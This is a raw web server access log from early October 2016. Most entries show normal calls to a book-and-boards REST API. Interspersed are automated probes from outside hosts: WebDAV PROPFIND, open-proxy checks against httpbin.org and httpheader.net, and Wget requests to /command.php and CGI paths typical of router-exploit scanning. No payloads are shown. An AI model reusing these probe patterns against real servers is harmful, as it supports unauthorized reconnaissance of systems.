2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:56:38 -0600] "GET /v1//users/16/board/16/block/17 HTTP/1.1" 200 1337 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:56:57 -0600] "GET /v1//volume/5 HTTP/1.1" 200 1382 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:56:57 -0600] "GET /v1//volume/5/book/2 HTTP/1.1" 200 297 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:57:01 -0600] "GET /v1//volume/5/book/2/chapter/2 HTTP/1.1" 200 11015 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:57:11 -0600] "GET /v1//users/16/boards HTTP/1.1" 200 804 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:57:15 -0600] "GET /v1//users/16/board/26 HTTP/1.1" 200 157 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:57:15 -0600] "GET /v1//volumes HTTP/1.1" 200 1319 "-" "-"
164.132.201.51 - - [01/Oct/2016:12:57:21 -0600] "PROPFIND /webdav/ HTTP/1.1" 405 233 "-" "WEBDAV Client"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:57:35 -0600] "GET /v1//users/16/boards HTTP/1.1" 200 804 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:57:37 -0600] "GET /v1//users/16/board/16 HTTP/1.1" 200 527 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:57:38 -0600] "GET /v1//volumes HTTP/1.1" 200 1319 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:57:46 -0600] "GET /v1//users/16/boards HTTP/1.1" 200 804 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:57:50 -0600] "GET /v1//users/16/board/32 HTTP/1.1" 200 242 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:57:50 -0600] "GET /v1//volumes HTTP/1.1" 200 1319 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:57:55 -0600] "GET /v1//users/16/boards HTTP/1.1" 200 804 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:57:57 -0600] "GET /v1//users/16/board/26 HTTP/1.1" 200 246 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:57:58 -0600] "GET /v1//volumes HTTP/1.1" 200 1319 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:58:00 -0600] "GET /v1//users/16/board/26/block/22 HTTP/1.1" 200 262 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:58:05 -0600] "GET /v1//volume/3 HTTP/1.1" 200 3459 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:58:08 -0600] "GET /v1//volume/3 HTTP/1.1" 200 3459 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:58:09 -0600] "GET /v1//volume/3/book/11 HTTP/1.1" 200 712 "-" "-"
2600:3c03::f03c:91ff:fe79:ba6f - - [01/Oct/2016:12:58:13 -0600] "GET /v1//volume/3/book/11/chapter/16 HTTP/1.1" 200 9438 "-" "-"
93.174.93.218 - - [01/Oct/2016:13:45:22 -0600] "GET http://httpheader.net/ HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.28) Gecko/20120306 Firefox/3.6.28 (.NET CLR 3.5.30729)"
93.174.93.218 - - [01/Oct/2016:13:45:42 -0600] "-" 408 - "-" "-"
93.174.93.218 - - [01/Oct/2016:13:46:02 -0600] "-" 408 - "-" "-"
189.34.146.35 - - [01/Oct/2016:16:47:56 -0600] "GET /cgi/common.cgi HTTP/1.0" 404 212 "-" "Wget(linux)"
189.34.146.35 - - [01/Oct/2016:16:47:56 -0600] "GET /stssys.htm HTTP/1.0" 404 208 "-" "Wget(linux)"
189.34.146.35 - - [01/Oct/2016:16:47:56 -0600] "GET / HTTP/1.0" 200 597 "-" "Wget(linux)"
189.34.146.35 - - [01/Oct/2016:16:47:57 -0600] "POST /command.php HTTP/1.0" 404 209 "-" "Wget(linux)"
183.129.160.229 - - [01/Oct/2016:16:48:42 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
183.129.160.229 - - [01/Oct/2016:16:48:42 -0600] "test" 200 597 "-" "-"
69.30.226.219 - - [01/Oct/2016:22:45:26 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)"
95.211.144.70 - - [02/Oct/2016:01:42:26 -0600] "\x16\x03\x01" 400 226 "-" "-"
95.211.144.70 - - [02/Oct/2016:01:42:27 -0600] "GET / HTTP/1.0" 200 597 "-" "-"
95.211.144.70 - - [02/Oct/2016:01:42:28 -0600] "GET / HTTP/1.1" 200 597 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
95.211.144.70 - - [02/Oct/2016:01:42:28 -0600] "CONNECT httpbin.org:443 HTTP/1.1" 200 597 "-" "-"
95.211.144.70 - - [02/Oct/2016:01:42:28 -0600] "GET /CHANGELOG.txt HTTP/1.1" 404 211 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
95.211.144.70 - - [02/Oct/2016:01:42:28 -0600] "GET /readme.html HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36"
95.211.144.70 - - [02/Oct/2016:01:42:29 -0600] "GET http://httpbin.org/get HTTP/1.1" 404 201 "-" "Go-http-client/1.1"
